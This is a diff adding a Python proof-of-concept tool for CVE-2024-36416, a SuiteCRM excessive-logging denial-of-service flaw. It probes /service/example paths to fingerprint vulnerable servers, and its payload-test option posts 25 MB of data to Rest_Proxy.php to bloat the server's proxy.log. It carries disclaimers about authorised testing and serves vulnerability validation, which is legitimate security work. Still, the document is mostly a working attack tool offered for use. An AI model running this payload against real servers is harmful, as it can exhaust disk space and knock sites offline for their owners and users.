@@ -1,0 +1,192 @@
+import requests, argparse, urllib3
+from termcolor import colored
+
+logo=["",
+      "    ▄▄▄  ▄  ▄  ▄  ▄  ▄  ▄  ▄   ▄  ▄▄▄▄   ▄▄▄▄  ▄  ▄    ",
+      "    █    █  █  █ █▀  █  █  ██  █  █  █   █  █  █  █    ",
+      "    █▄▄  █  █  █▄█   █  █  █ █ █  █▄▄█   █▄▄█  █▄▄█    ",
+      "      █  █  █  █ █   █  █  █  ██  █  █   █       █     ",
+      "    ▄▄█  █▄▄█  █ ▀█  █▄▄█  █   █  █  █ ▄ █      █      ",
+      ""]
+                                                            
+logo_quiet = False
+
+banner=["Vuln:       CVE-2024-36416",
+        "Author:     Elysee Franchuk",
+        "Email:      elyseemafranchuk@gmail.com",
+        "CVE DB:     https://www.cve.org/CVERecord?id=CVE-2024-36416",
+        "Versions:   suiteCRM <=7.14.3, 8.6.0",
+        "Details:    Excessive logging allows for DoS.",
+        "",
+        "Disclaimer: Use this script to validate the vulnerability, and to demonstrate the",
+        "            risk from adversaries. This tool is not intended to be modified and used",
+        "            for malicious purposes. The author is not responsible for collateral",
+        "            Damage that can be caused. Use responsibly.\n",
+        "            All results should be verified against server versions and mitigations.\n"]
+    
+url     = "https://127.0.0.1:443"
+headers = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Chrome/121.0.6167.160 Safari/537.36"}
+
+# Disable warning about SSL, comment out if needed
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+mb = 25
+payload = 'a'*1024*1024*mb # 25MB
+
+
+def con(url):
+    try:
+        r = requests.get(url, timeout=10, headers=headers)
+        
+    except Exception as e:
+        print("Error: " + str(e))
+        exit(1)
+        
+    return r
+
+def validate():
+    global headers
+    status = False
+    status_2 = False
+    status_3 = False
+    r = con(url)
+    
+    
+    if "/service/example/Rest_Proxy.php" in url:
+    	print("[*] Path '/service/example/Rest_Proxy.php' appears to be included in the url, only performing basic detection...")  
+    
+    elif "/service/example" in url:
+        print("[*] Path '/service/example/' appears to be included in the url, detection might not work...")
+        
+
+    elif "/service" in url:
+        print("[*] Path '/service' appears to be included in the url, detection might not work...")  
+        
+         
+    if "/service/example/Rest_Proxy.php" in url:
+        if r.status_code == 404:
+            if "X-Content-Type-Options" in str(r.headers):
+                print(colored("[+] Potentially Vulnerable - web server responded with 404 & 'X-Content-Type-Options'","red"))
+                print("Use root directory for more accurate results")
+            else:
+                print(colored("[~] Potentially Not Vulnerable","yellow"))
+                print("Use root directory for more accurate results")
+                
+    else:
+        print("[*] Attempting to access: " + url + "/service/example/")
+        r = con(url+"/service/example")
+        if r.status_code == 403:
+            print(colored("[!] web server responded with status code 403 ("+url+"/service/example)","yellow"))
+            status = True
+            
+        print("[*] Attempting to access: " + url + "/service/example/example.html")
+        r = con(url+"/service/example/example.html")
+        if r.status_code == 200:
+            print(colored("[!] web server responded with status code 200 ("+url+"/service/example/example.html)","yellow"))
+            status_2 = True
+        
+        # Used to test before but anything with ".log" will return a 302 regardless
+        """print("[*] Attempting to access: " + url + "/service/example/proxy.log")
+        r = con(url+"/service/example/proxy.log")
+        if r.status_code == 403:
+            if "X-Content-Type-Options" in str(r.headers):
+            	print(colored("[!] web server responded with status code 403 and X-Content-Type-Options header ("+url+"/service/example/proxy.log)","yellow"))
+            	status_3 = True
+            elif "X-Content-Type-Options" not in str(r.headers):
+            	print(colored("[+] web server responded with regular status code 403 ("+url+"/service/example/proxy.log)","white"))"""
+        
+        print("[*] Attempting to access: " + url + "/service/example/Rest_Proxy.php")
+        r = con(url+"/service/example/Rest_Proxy.php")
+        if r.status_code == 404:
+            if "X-Content-Type-Options" in str(r.headers) and status and status_2:
+                print(colored("[+] Web Server Vulnerable - web server responded with 404 & 'X-Content-Type-Options'","red"))
+                
+            elif "X-Content-Type-Options" not in str(r.headers) and status and status_2:
+                print(colored("[+] Web Server Likely Vulnerable - web server responded to all files in target directory","red"))
+                    
+            elif status and not status_2:
+                print(colored("[~] Web Server may be a vulnerable version (<=7.14.3, 8.6.0) - web server responded to target directory","yellow"))
+                print(colored("    The web server may not be exploitable","yellow"))
+            
+            else:
+                print(colored("[+] Web Server not vulnerable","green"))
+    
+def payload_test():     
+    global payload
+    global mb
+    global url
+    
+    headers = {"Content-Type":"application/x-www-form-urlencoded"}
+    print("\nDisclaimer: You are attempting to upload %smb of data, make sure this is within the" % mb)
+    print("            rules of engagement and approved by the asset owners / administrators.\n")
+    answer = input(str("Are you sure you want to proceed? (Y/N): "))
+    answer = answer.upper() # Make uppercase
+    if answer == 'Y':
+        print("[+] Sending %sMB" % mb)
+        
+        if "/service/example/Rest_Proxy.php" not in url:
+            url = url + "/service/example/Rest_Proxy.php"
+        
+        r = requests.post(url=url, data=payload, headers=headers)
+        print("[*] Check Log File '/service/example/proxy.log', if this file is >= 25MB the web server is vulnerable")
+    else:
+        print("Not proceeding with data upload.")
+    
+# Print the logo, use -q to suppress
+def logo_print():
+    global logo
+    for line in logo:
+        print(colored(line,"red"))
+        
+def banner_print():
+    global banner
+    for line in banner:
+        print(line)
+
+#logo_print()
+#banner_print()
+#injection_test()
+
+def main():
+    global url
+    epilog="""
+    e.g. python3 sukuna.py -u https://10.0.0.1 --validate
+    e.g. python3 sukuna.py -u https://10.0.0.1 --validate --upload-test
+    
+    (web server root directory may differ)
+    e.g. python3 sukuna.py -u http://10.0.0.1/SuiteCRM-7.14.3/ -v -q
+    e.g. python3 sukuna.py -u http://10.0.0.1/suite7/docroot/ -v -a
+    
+    note: Use root directory for SuiteCRM for more accurate results
+    """
+    
+    parser = argparse.ArgumentParser(usage=epilog)
+    parser.add_argument("-u", "--url", help="Target url", type=str, required=True)
+    parser.add_argument("-v", "--validate", help="Validate", action="store_true")
+    parser.add_argument("-q", "--quiet", help="No logo, only output", action="store_true")
+    parser.add_argument("-a", "--payload-test", help="Appends Data to Log (Active)", action="store_true")
+    args = parser.parse_args()
+    
+    if args.quiet:
+        logo_quiet = True
+    else:
+        logo_print()
+        
+    # Print banner regardless.    
+    banner_print()
+    
+    if args.validate == False and args.payload_test == False:
+        print("[-] Incorrect arguments. Please select -i or -v to run the script.")
+    
+    if args.url:
+        url = args.url
+    
+    if args.validate:
+        validate()
+        
+    if args.payload_test:
+        payload_test()
+        
+
+if __name__ == "__main__":
+    main()
